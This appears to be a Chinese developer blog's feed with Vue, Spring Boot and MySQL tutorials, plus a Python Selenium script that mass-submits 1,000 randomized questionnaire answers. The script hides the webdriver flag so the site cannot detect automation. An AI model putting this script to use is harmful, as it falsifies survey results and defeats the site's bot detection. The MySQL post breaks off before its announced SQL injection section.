class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Parent - 0 - Foo</span><br><span class="line">Parent - 1 - Bar</span><br></pre></td></tr></table></figure><p>你也可以使用 v-for 来遍历一个对象的所有属性。遍历的顺序会基于对该对象调用 Object.keys() 的返回值来决定:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">const myObject = reactive(&#123;</span><br><span class="line">  title: &#x27;How to do lists in Vue&#x27;,</span><br><span class="line">  author: &#x27;Jane Doe&#x27;,</span><br><span class="line">  publishedAt: &#x27;2016-04-10&#x27;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li v-for=&quot;(value, key, index) in myObject&quot;&gt;</span><br><span class="line">  &#123;&#123; index &#125;&#125;. &#123;&#123; key &#125;&#125;: &#123;&#123; value &#125;&#125;</span><br><span class="line">&lt;/li&gt;</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><p>效果:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0. title: How to do lists in Vue</span><br><span class="line">1. author: Jane Doe</span><br><span class="line">2. publishedAt: 2016-04-10</span><br></pre></td></tr></table></figure><h4 id="通过-key-管理状态​"><a href="#通过-key-管理状态​" class="headerlink" title="通过 key 管理状态​"></a>通过 key 管理状态​</h4><p>Vue 默认按照“就地更新”的策略来更新通过 v-for 渲染的元素列表。当数据项的顺序改变时，Vue 不会随之移动 DOM 元素的顺序，而是就地更新每个元素，确保它们在原本指定的索引位置上渲染。</p><p>默认模式是高效的，但只适用于列表渲染输出的结果不依赖子组件状态或者临时 DOM 状态 (例如表单输入值) 的情况。</p><p>为了给 Vue 一个提示，以便它可以跟踪每个节点的标识，从而重用和重新排序现有的元素，你需要为每个元素对应的块提供一个唯一的 key attribute</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;div v-for=&quot;item in items&quot; :key=&quot;item.id&quot;&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><h3 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h3><h4 id="事件监听"><a href="#事件监听" class="headerlink" title="事件监听"></a>事件监听</h4><p>可以使用 v-on 指令 (简写为 @) 来监听 DOM 事件，并在事件触发时执行对应的 JavaScript。用法：v-on:click&#x3D;”handler” 或 @click&#x3D;”handler”。</p><p>事件处理器 (handler) 的值可以是：<br>内联事件处理器：事件被触发时执行的内联 JavaScript 语句 (与 onclick 类似)。<br>方法事件处理器：一个指向组件上定义的方法的属性名或是路径。</p><ul><li><p>内联事件处理器<br>  内联事件处理器通常用于简单场景，例如:</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;button v-on:click=&quot;count++&quot;&gt;addCount&lt;/button&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123;count&#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">data()&#123;</span><br><span class="line">    return &#123;</span><br><span class="line">    count:0</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>方法事件处理器<br>  随着事件处理器的逻辑变得愈发复杂，内联代码方式变得不够灵活。因此 v-on 也可以接受一个方法名或对某个方法的调用。<br>  例如:</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;button v-on:click=&quot;addCount&quot;&gt;addCount&lt;/button&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123;count&#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">// 数据</span><br><span class="line">data()&#123;</span><br><span class="line">    return &#123;</span><br><span class="line">    count:0</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br><span class="line">// 方法</span><br><span class="line">methods:&#123;</span><br><span class="line">    addCount()&#123;</span><br><span class="line">    // 用this去访问data中定义的数据</span><br><span class="line">    this.count++</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ul><h4 id="事件传参"><a href="#事件传参" class="headerlink" title="事件传参"></a>事件传参</h4>]]></content>
      
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识Spring boot</title>
      <link href="/2023/12/25/%E5%88%9D%E8%AF%86Spring-boot/"/>
      <url>/2023/12/25/%E5%88%9D%E8%AF%86Spring-boot/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring-boot"><a href="#Spring-boot" class="headerlink" title="Spring boot"></a>Spring boot</h1><p>可以快速的构建Spring项目 免去大部分配置</p><p>SpringBoot中的几个含义定义</p><ol><li><p>Bean: Spring IOC 容器管理的对象 是大多数应用程序的逻辑源码<br>  Spring Bean的定义和管理:</p><ul><li><p>使用构造型 @Component 注释你的类</p></li><li><p>用@Bean：这个注解要加在方法上，然后返回值是要实例化的类。<br>  如: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">@Configuration</span><br><span class="line">class Test&#123;</span><br><span class="line"></span><br><span class="line">  @Autowired</span><br><span class="line">  TestClass testClass;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  @Bean</span><br><span class="line">  public TestClass getTestClass()&#123;</span><br><span class="line"></span><br><span class="line">    return new TestClass();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class TestClass&#123; &#125;</span><br></pre></td></tr></table></figure></li><li><p>@Import：可以直接导入想要被Spring Boot管理的类<br>  如:   </p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@Configuration</span><br><span class="line">@Import(TestClass.class)</span><br><span class="line">class Test&#123;</span><br><span class="line"></span><br><span class="line">  @Autowired</span><br><span class="line">  TestClass testClass;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class TestClass&#123; &#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>SpringMVC: 实现javaWeb SpringMVC底层就是Servlet,SpringMVC就是对Servlet进行深层次的封装。</p></li><li><p>Mybatis:持久层框架 免除了JDBC代码的重复性，通过提供dao层(数据访问层，实现对数据库增删改查等操作)，将业务逻辑和数据访问逻辑分离</p></li></ol><ul><li>用法实例: <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    public class User &#123;</span><br><span class="line"></span><br><span class="line">    //    TableID 标识主键(一定要标识主键,不然会影响更新和删除)</span><br><span class="line">    //    IdType.NONE：不使用任何主键生成策略。</span><br><span class="line">    //    IdType.INPUT：用户输入，适用于手动输入主键值。</span><br><span class="line">    //    IdType.ID_WORKER：全局唯一ID，适用于分布式系统。</span><br><span class="line">    //    IdType.UUID：全局唯一UUID，适用于分布式系统。</span><br><span class="line">    //    IdType.ID_WORKER_STR：字符串类型的全局唯一ID，适用于分布式系统。</span><br><span class="line">    @TableId(value = &quot;账号&quot;, type = IdType.AUTO)</span><br><span class="line">    private String userName;</span><br><span class="line"></span><br><span class="line">    //    TableField 标识列</span><br><span class="line">    //    当exist = true（默认值）时，表示该实体类属性对应于数据库表中的一个字段12。</span><br><span class="line">    //    当exist = false时，表示该实体类属性在数据库表中没有对应的字段。这在你的实体类中有一些属性需要在Java代码中使用，但并不需要映射到数据库表时非常有用。</span><br><span class="line">    @TableField(value = &quot;密码&quot;,exist = true)</span><br><span class="line">    private String passWord;</span><br><span class="line"></span><br><span class="line">    @TableField(value = &quot;是否为管理员&quot;)</span><br><span class="line">    private String isAdmin;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">    @Mapper             // 标记一个Mapper接口 将他们注册为Bean 这样就可以用 @Autowired来使用Mapper接口</span><br><span class="line">    public interface UserDataChange extends BaseMapper&lt;User&gt; &#123;</span><br><span class="line">    // 继承BaseMapper接口   &lt;User&gt;是我的实体类 对应着数据库里面的一个表</span><br><span class="line">    // BaseMapper接口里面封装好了常用的数据库操作方法(增删改查)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><ol start="3"><li><p>Lombook: java开发的一种组件 可以帮助你快速的构建getter，setter，equals等方法</p><ul><li>以下是Lombok的一些主要特性:<br> 减少模板代码：Lombok可以用@Data注解自动生成getter、setter、equals、hashCode、toString等方法，从而减少模板代码。<br> 支持链式编程：通过@Builder注解，Lombok可以为类生成builder API，从而支持链式编程。<br> 简化变量日志声明：通过@Log等注解，Lombok可以为类自动生成日志变量。<br> 自动生成构造函数：通过@NoArgsConstructor(无参构造)、@RequiredArgsConstructor、@AllArgsConstructor(全参构造)等注解，Lombok可以为类生成构造函数</li></ul></li><li><p>Pojo:<br>  POJO，全称为Plain Old Java Object，简单的说就是普通的Java对象。它没有继承任何类，也没有实现任何接口，更没有被其他框架侵入。<br>  以下是POJO的一些主要特性:</p><ul><li>简单：POJO是简单的Java对象，它不需要继承或实现任何特定的类或接口。</li><li>灵活：由于POJO没有被任何框架侵入，因此它具有很高的灵活性，可以任意扩展，从而胜任多个场合。</li><li>易于测试：POJO让开发者可以专注于业务逻辑和脱离框架的单元测试。</li><li>无框架依赖：POJO并不需要继承框架的类或实现其接口，开发者能够极其灵活地搭建继承结构和建造应用。</li></ul></li></ol><p>SpringBoot的四个软件包(基于面向切面编程):</p><ul><li>Controller包: 接收web请求处理</li><li>Service包: 业务层 (实现对数据库数据处理和提供需求数据)</li><li>dao包: 抽象数据库行为(增删改查 )</li><li>pojo包: 把数据抽象为类 供dao操作</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某问卷自动化脚本</title>
      <link href="/2023/11/15/%E6%9F%90%E9%97%AE%E5%8D%B7%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC/"/>
      <url>/2023/11/15/%E6%9F%90%E9%97%AE%E5%8D%B7%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p><strong>本脚本仅供学习交流，请勿用于商业用途，使用本脚本造成的任何后果与本人无关。</strong></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"># 某问卷全自动化填写问卷 思政作业想偷懒写的emmm...</span><br><span class="line"># Author:isyang_</span><br><span class="line"># 声明:</span><br><span class="line"># 本脚本不得用于售卖和非法用途,仅用于学习</span><br><span class="line"># 脚本使用了selenium和pyautogui进行模拟登录和鼠标宏全自动化答卷</span><br><span class="line"># 使用本脚本需要安装最新的chrome浏览器</span><br><span class="line"># 不同问卷需要根据代码进行重构,比如改题目数量,题目选项结构,题目xpath,以及提交按钮的坐标,具体见代码注释</span><br><span class="line"></span><br><span class="line">import time</span><br><span class="line">import random</span><br><span class="line">import pyautogui</span><br><span class="line">from selenium import webdriver</span><br><span class="line">from selenium.webdriver.common.by import By</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def spider(num, url):</span><br><span class="line">    for i in range(num):</span><br><span class="line">        option = webdriver.ChromeOptions() # 创建一个chrome浏览器选项对象</span><br><span class="line">        option.add_experimental_option(&#x27;excludeSwitches&#x27;, [&#x27;enable-automation&#x27;]) # 禁用参数,防止脚本被检测</span><br><span class="line">        option.add_experimental_option(&#x27;useAutomationExtension&#x27;, False) # 禁用浏览器扩展(提高脚本稳定性)</span><br><span class="line"></span><br><span class="line">        browser = webdriver.Chrome(options=option) # 创建一个Chrome对象</span><br><span class="line"></span><br><span class="line">        # 向浏览器发送一个控制命令，将 &quot;webdriver&quot; 属性设置为 undefined。这可以防止浏览器检测到自动化脚本，从而提高脚本在浏览器中的稳定性</span><br><span class="line">        browser.execute_cdp_cmd(&#x27;Page.addScriptToEvaluateOnNewDocument&#x27;,</span><br><span class="line">                                &#123;&#x27;source&#x27;: &#x27;Object.defineProperty(navigator, &quot;webdriver&quot;, &#123;get: () =&gt; undefined&#125;)&#x27;&#125;)</span><br><span class="line">        </span><br><span class="line">        browser.maximize_window()  # 窗口最大化</span><br><span class="line"></span><br><span class="line">        # 再次将 &quot;webdriver&quot; 属性设置为 undefined。</span><br><span class="line">        browser.execute_cdp_cmd(&#x27;Page.addScriptToEvaluateOnNewDocument&#x27;,</span><br><span class="line">                                &#123;&#x27;source&#x27;: &#x27;Object.defineProperty(navigator, &quot;webdriver&quot;, &#123;get: () =&gt; undefined&#125;)&#x27;</span><br><span class="line">                                 &#125;)</span><br><span class="line"></span><br><span class="line">        browser.get(url) # 使用浏览器对象访问指定url</span><br><span class="line">        time.sleep(2)</span><br><span class="line"></span><br><span class="line">        # 设置自动答题的配置 </span><br><span class="line">        # range中的范围是你的总题目数</span><br><span class="line">        for question_num in range(1, 12):</span><br><span class="line">            if question_num &lt;= 3:               # 设置多选题的配置,这里为1-3题,选项为A-E,这里我设置的是A-C中随机选一个,D-E中随机选一个</span><br><span class="line">                num1 = random.randint(1, 3)</span><br><span class="line">                num2 = random.randint(4, 5)</span><br><span class="line">            elif question_num &lt;= 8:             # 设置单选题,这里为4-8题,选项为A-D </span><br><span class="line">                num1 = random.randint(1, 4)</span><br><span class="line">                num2 = None</span><br><span class="line">            else:                               # 设置判断题(双选题),这里为9-12题</span><br><span class="line">                num1 = random.randint(1, 2)</span><br><span class="line">                num2 = None </span><br><span class="line"></span><br><span class="line">            # 拼接xpath路径 让浏览器找到对应的元素并且模拟鼠标点击 </span><br><span class="line">            if num2 is not None:                </span><br><span class="line">                if browser.find_element(by=By.XPATH, value=f&quot;//div[@for=&#x27;q&#123;question_num&#125;_&#123;num1&#125;&#x27;]&quot;):</span><br><span class="line">                    browser.find_element(by=By.XPATH, value=f&quot;//div[@for=&#x27;q&#123;question_num&#125;_&#123;num1&#125;&#x27;]&quot;).click()</span><br><span class="line">                    browser.find_element(by=By.XPATH, value=f&quot;//div[@for=&#x27;q&#123;question_num&#125;_&#123;num2&#125;&#x27;]&quot;).click()</span><br><span class="line">            else:</span><br><span class="line">                if browser.find_element(by=By.XPATH, value=f&quot;//div[@for=&#x27;q&#123;question_num&#125;_&#123;num1&#125;&#x27;]&quot;):</span><br><span class="line">                    browser.find_element(by=By.XPATH, value=f&quot;//div[@for=&#x27;q&#123;question_num&#125;_&#123;num1&#125;&#x27;]&quot;).click()</span><br><span class="line">            time.sleep(0.5)</span><br><span class="line"></span><br><span class="line">        pyautogui.scroll(-500) # 移动鼠标滚轮到最下面</span><br><span class="line">        time.sleep(1)</span><br><span class="line">        pyautogui.moveTo(1274, 1364) # 将鼠标移动到指定位置(提交按钮)</span><br><span class="line">        time.sleep(3)</span><br><span class="line">        pyautogui.click() # 点击鼠标</span><br><span class="line">        time.sleep(5)</span><br><span class="line">        browser.close() # 关闭浏览器</span><br><span class="line">        print(f&quot;第&#123;i + 1&#125;份已经完成&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    num = 1000  # 填的份数</span><br><span class="line">    url = &#x27;https://www.xxxxx.com&#x27; # 问卷链接</span><br><span class="line">    spider(num, url)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql基础使用和sql注入</title>
      <link href="/2023/11/09/mysql%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E5%92%8Csql%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/11/09/mysql%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E5%92%8Csql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="mysql-基础使用"><a href="#mysql-基础使用" class="headerlink" title="mysql 基础使用"></a>mysql 基础使用</h1><h2 id="mysql-登录"><a href="#mysql-登录" class="headerlink" title="mysql 登录"></a>mysql 登录</h2><ul><li>1.启动服务<br>  进入mysql的bin目录,启动命令行  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start mysql</span><br></pre></td></tr></table></figure></li><li>2.登录数据库  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h &lt;服务器ip&gt; -u &lt;数据库用户名&gt; -p&lt;密码&gt;</span><br></pre></td></tr></table></figure>  密码要和-p连一起,数据库是分权限的,只有root用户有所有数据库的操作权限,其他的用户只能操作他所对应的数据库</li></ul><h2 id="mysql-常用命令"><a href="#mysql-常用命令" class="headerlink" title="mysql 常用命令"></a>mysql 常用命令</h2><h3 id="数据库操作命令"><a href="#数据库操作命令" class="headerlink" title="数据库操作命令"></a>数据库操作命令</h3><ul><li>1.创建数据库  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> database <span class="operator">&lt;</span>数据库名<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure></li><li>2.创建表  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> (<span class="operator">&lt;</span>字段名<span class="number">1</span><span class="operator">&gt;</span> <span class="operator">&lt;</span>字段类型<span class="operator">&gt;</span> [<span class="operator">&lt;</span>字段约束<span class="operator">&gt;</span>],<span class="operator">&lt;</span>字段名<span class="number">2</span><span class="operator">&gt;</span> <span class="operator">&lt;</span>字段类型<span class="operator">&gt;</span> [<span class="operator">&lt;</span>字段约束<span class="operator">&gt;</span>],<span class="operator">&lt;</span>...<span class="operator">&gt;</span>);</span><br></pre></td></tr></table></figure></li><li>3.插入数据  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> exitdata (<span class="operator">&lt;</span>字段名<span class="number">1</span><span class="operator">&gt;</span>,<span class="operator">&lt;</span>字段名<span class="number">2</span><span class="operator">&gt;</span>) <span class="keyword">values</span> (<span class="operator">&lt;</span>数据<span class="number">1</span>字段<span class="number">1</span>内容<span class="operator">&gt;</span>,<span class="operator">&lt;</span>数据<span class="number">1</span>字段<span class="number">2</span>内容<span class="operator">&gt;</span>),(<span class="operator">&lt;</span>数据<span class="number">2</span>字段<span class="number">1</span>内容<span class="operator">&gt;</span>,<span class="operator">&lt;</span>数据<span class="number">2</span>字段<span class="number">2</span>内容<span class="operator">&gt;</span>),(...);</span><br></pre></td></tr></table></figure></li><li>4.修改数据  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updata <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> <span class="keyword">set</span> <span class="operator">&lt;</span>字段名<span class="operator">&gt;</span> <span class="operator">=</span> <span class="operator">&lt;</span>新值<span class="operator">&gt;</span> <span class="keyword">where</span> <span class="operator">&lt;</span>条件<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure></li><li>5.删除数据  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> <span class="keyword">where</span> <span class="operator">&lt;</span>条件<span class="operator">&gt;</span>; # 如果没有<span class="keyword">where</span><span class="operator">+</span>条件,会删除表下的所有数据,但会保留表结构</span><br></pre></td></tr></table></figure></li><li>6.删除表&#x2F;删除数据库  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 删除表</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span>;</span><br><span class="line"># 删除数据库</span><br><span class="line"><span class="keyword">drop</span> database <span class="operator">&lt;</span>数据库名<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure></li></ul><h3 id="数据库查询命令"><a href="#数据库查询命令" class="headerlink" title="数据库查询命令"></a>数据库查询命令</h3><ul><li>1.查询数据库所有的库名  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br></pre></td></tr></table></figure></li><li>2.查询数据库下所有的表名  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use <span class="operator">&lt;</span>数据库名<span class="operator">&gt;</span>;</span><br><span class="line"><span class="keyword">show</span> tables;</span><br></pre></td></tr></table></figure></li><li>3.查询表下有哪些字段  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">describe</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span>;</span><br><span class="line">或者</span><br><span class="line"><span class="keyword">desc</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure></li><li>4.查询表下所有字段的所有数据  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span>; # <span class="operator">*</span> 为所有字段</span><br></pre></td></tr></table></figure></li><li>5.查询表下指定字段  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">&lt;</span>字段名<span class="number">1</span><span class="operator">&gt;</span>,<span class="operator">&lt;</span>字段名<span class="number">2</span><span class="operator">&gt;</span>,<span class="operator">&lt;</span>...<span class="operator">&gt;</span> <span class="keyword">from</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure></li><li>6.查询表下指定字段,并指定查询条件  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">&lt;</span>字段名<span class="number">1</span><span class="operator">&gt;</span>,<span class="operator">&lt;</span>字段名<span class="number">2</span><span class="operator">&gt;</span>,<span class="operator">&lt;</span>...<span class="operator">&gt;</span> <span class="keyword">from</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> <span class="keyword">where</span> <span class="operator">&lt;</span>查询条件<span class="operator">&gt;</span>;</span><br><span class="line"># 例如: (从logindata表中查询userid为<span class="number">1111</span>的用户,并且给出该用户的userid和logintoken字段)</span><br><span class="line"><span class="keyword">select</span> userid,logintoken <span class="keyword">from</span> logindata <span class="keyword">where</span> userid<span class="operator">=</span><span class="number">1111</span>;</span><br></pre></td></tr></table></figure></li><li>7.列出表中不同的值  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> <span class="operator">&lt;</span>字段名<span class="number">1</span><span class="operator">&gt;</span>,<span class="operator">&lt;</span>字段名<span class="number">2</span><span class="operator">&gt;</span>,<span class="operator">&lt;</span>...<span class="operator">&gt;</span> <span class="keyword">from</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> <span class="keyword">where</span> <span class="operator">&lt;</span>查询条件<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure>查询条件中,可以运用<strong>括号,or和and运算符</strong>用来创建更加复杂的查询条件</li></ul><p>其他查询:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 查看数据表存储引擎:</span><br><span class="line"><span class="keyword">show</span> engines；</span><br><span class="line"># 查询时间:     </span><br><span class="line"><span class="keyword">select</span> now();</span><br><span class="line"># 查询当前用户:</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>();</span><br><span class="line"># 查询当前使用的数据库:</span><br><span class="line"><span class="keyword">select</span> database();</span><br><span class="line"># 查询数据库版本:</span><br><span class="line"><span class="keyword">select</span> version();</span><br><span class="line"># 查看当前操作系统:</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@version</span>_compile_os;</span><br></pre></td></tr></table></figure><p><strong>order 